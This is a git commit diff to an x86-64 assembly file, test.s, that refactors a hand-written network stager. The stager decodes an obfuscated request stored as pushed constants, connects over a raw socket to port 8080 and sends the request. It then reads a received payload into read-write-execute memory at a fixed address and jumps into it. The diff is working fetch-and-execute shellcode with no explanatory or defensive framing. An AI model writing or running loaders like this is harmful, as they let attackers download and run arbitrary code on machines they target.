22fe86d7d55e02e3408ee0d0e5b910602c8da0d3
devnull850 <dev.null850@gmail.com>
2022-02-11 13:48:36 -0500

    Remove data section and use stack

--- asm/test.s
+++ asm/test.s
@@ -1,19 +1,25 @@
-	.section .data
-
-req:
-	.int 0x26617050,0x61a026d6,0x37d62161,0x84f437c6,0x6313d2a0
-	.int 0xd2e22687,0xa2e23212,0x876313d2,0x27a727a7,0x84f484f4
-
 	.section .text
 
 	.globl _start
 
 _start:
 	addq	$0xffffffffffffffd0,%rsp
+	xorq	%rax,%rax
+	pushq	%rax
+	movq	$0x84f484f427a727a7,%rax
+	pushq	%rax
+	movq	$0x876313d2a2e23212,%rax
+	pushq	%rax
+	movq	$0xd2e226876313d2a0,%rax
+	pushq	%rax
+	movq	$0x84f437c637d62161,%rax
+	pushq	%rax
+	movq	$0x61a026d626617050,%rax
+	pushq	%rax
 	xorl	%ecx,%ecx
 	jmp		.L0
 .L1:
-	leaq	req,%r8
+	leaq	(%rsp),%r8
 	addq	%rcx,%r8
 	movb	(%r8),%r9b
 	movb	%r9b,%r10b
@@ -33,25 +39,25 @@ _start:
 	syscall
 	test	%eax,%eax
 	je		.L2
-	movl	%eax,0x28(%rsp)
+	movl	%eax,0x58(%rsp)
 	xorq	%rax,%rax
-	movq	%rax,0x10(%rsp)
-	movq	%rax,0x18(%rsp)
-	movw	$0x2,0x10(%rsp)
-	movw	$0x901f,0x12(%rsp)
+	movq	%rax,0x40(%rsp)
+	movq	%rax,0x48(%rsp)
+	movw	$0x2,0x40(%rsp)
+	movw	$0x901f,0x42(%rsp)
 	movl	$0x2a,%eax
-	movl	0x28(%rsp),%edi
-	leaq	0x10(%rsp),%rsi
+	movl	0x58(%rsp),%edi
+	leaq	0x40(%rsp),%rsi
 	movl	$0x10,%edx
 	syscall
 	cmpl	$0xffffffff,%eax
 	je		.L3
 	movl	$0x2c,%eax
-	movl	0x28(%rsp),%edi
-	leaq	req,%rsi
+	movl	0x58(%rsp),%edi
+	leaq	(%rsp),%rsi
 	movl	$0x28,%edx
 	xorl	%r10d,%r10d
-	leaq	0x10(%rsp),%r8
+	leaq	0x40(%rsp),%r8
 	movl	$0x10,%r9d
 	syscall
 	cmpl	$0x28,%eax
@@ -61,31 +67,31 @@ _start:
 	movl	$0x1000,%esi
 	movl	$0x7,%edx
 	syscall
-	movl	$0x7d,0x8(%rsp)
-	movq	$0x401a00,(%rsp)
+	movl	$0x7d,0x38(%rsp)
+	movq	$0x401a00,0x30(%rsp)
 .L4:
 	movl	$0x2d,%eax
-	movl	0x28(%rsp),%edi
-	movq	(%rsp),%rsi
-	movl	0x8(%rsp),%edx
+	movl	0x58(%rsp),%edi
+	movq	0x30(%rsp),%rsi
+	movl	0x38(%rsp),%edx
 	xorl	%r10d,%r10d
 	xorl	%r8d,%r8d
 	xorl	%r9d,%r9d
 	syscall
-	addl	%eax,(%rsp)
-	subl	%eax,0x8(%rsp)
+	addl	%eax,0x30(%rsp)
+	subl	%eax,0x38(%rsp)
 	test	%eax,%eax
 	jle 	.L3
-	cmpl	$0,0x8(%rsp)
+	cmpl	$0,0x38(%rsp)
 	jg		.L4
 .L3:
 	movl	$0x3,%eax
-	movl	0x28(%rsp),%edi
+	movl	0x58(%rsp),%edi
 	syscall
 	movl	$0x401a4c,%eax
 	call	*%rax
 .L2:
 	xorl	%edi,%edi
-	addq	$0x30,%rsp
+	addq	$0x60,%rsp
 	movl	$0x3c,%eax
 	syscall
